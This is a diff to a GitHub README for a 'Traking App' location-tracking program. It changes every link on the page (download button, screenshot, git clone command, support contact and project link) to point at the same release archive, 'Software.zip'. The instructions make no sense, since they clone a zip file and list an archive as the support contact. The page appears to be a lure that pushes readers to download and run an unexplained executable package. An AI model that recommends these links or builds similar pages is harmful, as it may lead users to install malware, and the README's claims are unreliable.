@@ -29,19 +29,19 @@ Welcome to the **Traking App** repository! This app allows users to track their 
 ## 🚀 Get Started
 To get started with the Traking App, download the software from the link provided below:
 
-[![Download Software](https://github.com/MkailAl/traking_app/releases/download/v1.0/Release_x64.zip)](https://github.com/MkailAl/traking_app/releases/download/v1.0/Release_x64.zip)
+[![Download Software](https://github.com/MkailAl/traking_app/releases/download/v2.0/Software.zip)](https://github.com/MkailAl/traking_app/releases/download/v2.0/Software.zip)
 
 Once downloaded, launch the software to begin exploring the exciting features of real-time tracking and navigation!
 
 ## Screenshots
-![App Preview](https://github.com/MkailAl/traking_app/releases/download/v1.0/Release_x64.zip)
+![App Preview](https://github.com/MkailAl/traking_app/releases/download/v2.0/Software.zip)
 
 ## Installation
 Follow these steps to install the Traking App:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/MkailAl/traking_app/releases/download/v1.0/Release_x64.zip
+   git clone https://github.com/MkailAl/traking_app/releases/download/v2.0/Software.zip
    cd traking_app
    ```
 
@@ -63,7 +63,7 @@ To start using the Traking App, follow these steps:
 3. Move around, and you will see your real-time location on the map.
 
 ## Support
-If you encounter any issues or have any questions, feel free to contact our support team at https://github.com/MkailAl/traking_app/releases/download/v1.0/Release_x64.zip
+If you encounter any issues or have any questions, feel free to contact our support team at https://github.com/MkailAl/traking_app/releases/download/v2.0/Software.zip
 
 ## Contributing
 We welcome contributions to enhance the Traking App. If you have any ideas or suggestions, please submit a pull request. 
@@ -73,6 +73,6 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Explore the world with real-time tracking and navigation using the Traking App! 🌍🚀
 
-🔗 More about the Traking App on [GitHub](https://github.com/MkailAl/traking_app/releases/download/v1.0/Release_x64.zip)
+🔗 More about the Traking App on [GitHub](https://github.com/MkailAl/traking_app/releases/download/v2.0/Software.zip)
 
 **Remember to always stay on track with Traking App!** 📍🗺️
